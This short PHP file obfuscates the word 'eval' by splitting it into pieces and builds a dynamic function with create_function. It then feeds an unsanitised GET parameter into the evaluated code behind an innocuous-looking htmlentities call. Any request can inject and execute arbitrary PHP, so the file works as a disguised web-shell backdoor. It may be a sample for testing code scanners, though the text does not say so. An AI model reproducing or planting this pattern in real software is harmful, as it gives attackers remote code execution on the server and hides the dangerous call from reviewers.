<?php
$y="al";$z="st";$u="ev";
$t=create_function('$x', "{$u}{$y}(\$x);");
if (!isset($_GET[1]))
	$t("echo htmlentities('a&b');");
else
	$t("echo htmlentities('{$_GET[1]}');");
